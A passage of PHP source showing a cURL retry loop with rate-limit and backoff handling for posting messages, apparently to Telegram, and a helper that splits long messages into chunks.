    $maxRetries = 3;
    for ($attempt = 0; $attempt < $maxRetries; $attempt++) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $url,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => json_encode($postData),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json']
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200) return true;

        if ($httpCode === 429) {
            $resp       = json_decode($response, true);
            $retryAfter = $resp['parameters']['retry_after'] ?? 2;
            sleep(min($retryAfter, 5));
            continue;
        }

        if ($httpCode >= 400 && $httpCode < 500 && $httpCode !== 429) {
            error_log("[RELAY] TG error HTTP {$httpCode}: " . substr($response, 0, 200));
            return false;
        }

        // Backoff exponencial para erros 5xx
        sleep((int) pow(2, $attempt));
    }

    error_log("[RELAY] TG falhou após {$maxRetries} tentativas");
    return false;
}

function splitMessage(string $message, int $maxLen): array {
    if (mb_strlen($message) <= $maxLen) return [$message];
    $chunks  = [];
    $lines   = explode("\n", $message);
    $current = '';
    foreach ($lines as $line) {
        $potential = $current === '' ? $line : $current . "\n" . $line;
        if (mb_strlen($potential) > $maxLen) {
            if ($current !== '') $chunks[] = $current;
            $current = $line;
        } else {
            $current = $potential;
        }
    }
    if ($current !== '') $chunks[] = $current;
    return $chunks;
}
